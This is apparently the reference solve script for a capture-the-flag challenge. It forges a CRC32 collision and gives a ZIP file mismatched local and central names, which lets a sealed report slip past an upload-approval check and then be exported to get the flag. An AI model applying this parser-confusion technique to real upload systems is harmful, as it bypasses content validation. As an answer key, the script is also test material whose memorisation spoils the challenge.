#!/usr/bin/env python3
"""Reference solve using only public HTTP endpoints."""

from io import BytesIO
from urllib.request import Request, urlopen
from zipfile import ZIP_STORED, ZipFile
import sys
import zlib


def crc_suffix(prefix, target):
    zero = b"\0" * 4
    baseline = zlib.crc32(prefix + zero)
    basis = [0] * 32
    masks = [0] * 32
    for bit in range(32):
        column = zlib.crc32(prefix + (1 << bit).to_bytes(4, "little")) ^ baseline
        mask = 1 << bit
        while column:
            pivot = column.bit_length() - 1
            if basis[pivot]:
                column ^= basis[pivot]
                mask ^= masks[pivot]
            else:
                basis[pivot], masks[pivot] = column, mask
                break
    difference = target ^ baseline
    mask = 0
    while difference:
        pivot = difference.bit_length() - 1
        if not basis[pivot]:
            raise RuntimeError("CRC patch matrix is singular")
        difference ^= basis[pivot]
        mask ^= masks[pivot]
    suffix = mask.to_bytes(4, "little")
    assert zlib.crc32(prefix + suffix) == target
    return suffix


def split_zip():
    public = b"EXPORT public/welcome\nNOTE"
    secret_prefix = b"EXPORT sealed/report\nX"
    secret = secret_prefix + crc_suffix(secret_prefix, zlib.crc32(public))
    assert len(secret) == len(public)
    out = BytesIO()
    with ZipFile(out, "w", ZIP_STORED) as zip_file:
        zip_file.writestr("archive.note", secret)
        zip_file.writestr("manifest.txt", public)
    data = bytearray(out.getvalue())
    assert data[:4] == b"PK\x03\x04" and data[26:28] == b"\x0c\x00"
    data[30:42] = b"manifest.txt"  # local name only; central name remains archive.note
    return bytes(data)


def solve(base):
    base = base.rstrip("/")
    data = split_zip()
    with urlopen(Request(base + "/api/upload", data=data,
                         headers={"Content-Type": "application/zip"}, method="POST"), timeout=10) as response:
        upload_id = response.read().decode().strip()
    with urlopen(Request(base + "/api/approve/" + upload_id, data=b"", method="POST"), timeout=10) as response:
        if response.read().strip() != b"approved":
            raise RuntimeError("approval did not succeed")
    with urlopen(base + "/api/export/" + upload_id, timeout=10) as response:
        flag = response.read().decode().strip()
    if not flag.startswith("wctf{") or not flag.endswith("}"):
        raise RuntimeError("sealed report was not exported")
    return flag


if __name__ == "__main__":
    print(solve(sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"))
